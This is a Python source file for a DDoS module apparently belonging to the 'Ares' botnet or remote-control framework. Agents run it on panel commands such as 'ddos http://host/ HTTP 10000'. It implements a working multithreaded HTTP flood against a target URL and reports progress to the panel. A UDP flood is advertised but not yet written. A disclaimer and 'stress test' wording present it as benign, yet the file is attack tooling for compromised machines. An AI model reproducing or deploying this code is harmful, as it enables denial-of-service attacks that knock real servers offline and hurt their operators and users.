# Ares DDoS Module (LOIC Clone) + Layer 4 Socket based Attacks (UDP)
# Pythogen
# Build 1.3


# Not intended for illegal uses.


# 12/27/2015 - 4:34 PM - Bug fix: DDoS completion notice now correctly synchronized.

# 12/27/2015 - 4:42 PM - Update: Functional stop feature now included.

# 12/29/2015 - 1:01 PM - Update: Functionality refinement. Clean up syntax.

# 12/29/2015 - 2:58 PM - Update: Informs when every thousand requests have been sent until completion. (Panel Feedback)

# 1/10/2016  - 1:46 AM - Update: Refining Commands and including UDP Stress test option.


# Panel Command Format:

# ddos http://[host]/ [Attack Type] [requests] - [!] Important to include 'http://' in HTTP type attack
# ddos [URL] HTTP [requests]
# ddos [IP] UDP [requests]

# Examples:

# HTTP Stress Test:
# ddos http://something.com/ HTTP 10000

# UDP Stress Test
# ddos 11.22.33.44 UDP 10000

# Deactive All Tests
# ddos stop ALL 0

# Make sure to include 'ddos' in MODULES array in agent.py


# - Import Modules -

import requests
import time
import threading
import pythoncom
import pyHook
import utils
import random
import socket
import sys
import os
import string

from threading import Thread
from urllib import urlopen
from atexit import register
from os import _exit
from sys import stdout, argv



# - Stress functions -

def complete():
    # Announce completion
    utils.send_output("DDoS Complete.")


# Note: 10 Threads
def auto_send_request(server, number_of_requests=10):
    # Globalize increment variable
    global inc
    global isDos

    # Value for completion notification condition
    requestsCheck = (requests - 1)

    for z in range(number_of_requests):
        try:

            # Is it active?
            if isDos == True:

                # HTTP Connection >>
                urlopen(server)

                # Successful connection [!]
                stdout.write(".") # indicated by period in console (for debugging)

                # Increment ++
                inc = inc + 1 # Count total requests sent

                # Live display every thousand requests. 
                if inc % 1000 == 0:
                    utils.send_output("Requests: %s." % (inc))


            # if not active then break ..
            elif isDos == False:
                break

        except IOError:
            # Failed connection [!]
            stdout.write("E") # indicated by E in console (for debugging)

        # Request count checking
        if inc >= requestsCheck:

            # Finished DDoS Session! Call next function
            complete()

                

# Flood routine [HTTP Stress Testing]
def flood(url, number_of_requests = 1000, number_of_threads = 50):  
    number_of_requests_per_thread = int(number_of_requests/number_of_threads)
    try:
        for x in range(number_of_threads):
            Thread(target=auto_send_request, args=(url, number_of_requests_per_thread)).start()

    except:
        stdout.write("\n[E]\n")
    print("\nDone %i requests on %s" % (number_of_requests, url))



# - Command control -

def run(action, dtype, num_req):    
    # Globalize variables
    global requests
    global inc
    global isDos

    # inc initially set to 0
    inc = 0

    # isDos boolean
    isDos = False

    # If command passed is not 'stop' then it's a host

    # Start [HTTP Stress Test]
    if action != "stop" and dtype == "HTTP":

        utils.send_output("HTTP-DDoS Started.")
        
        # Boolean value that determines if stresser is active
        isDos = True

        # Argument passed from Ares panel
        server = action # Host put in server

        # Number of requests
        requests = int(num_req) # Specified number of requests

        # Call function to begin attack
        flood(server, requests)

    # Start [UDP Stress Test]
    elif action != "stop" and dtype == "UDP":

        utils.send_output("UDP-DDoS Started.")
        # Code to be included soon...

    # Halt Active Sessions
    elif action == "stop" and dtype =="ALL":

        # Turn it off
        isDos = False
        utils.send_output('All DDoS Sessions Deactivated.')

    else:

        # Display current commands
        utils.send_output("Usage: ddos [host] [Attack Type] [requests] | stop ALL 0")



def help():
    # Help command details
    help_text = """
    Usage: 

    HTTP Stress Test:

    Format [HTTP]:
    ddos http://[host]/ [Attack Type] [requests]

    HTTP Stress Start:
    ddos http://something.com/ HTTP 10000

    UDP Stress Start:
    ddos 11.22.33.44 UDP 10000

    Stop:
    ddos stop ALL 0

    """
    return help_text


    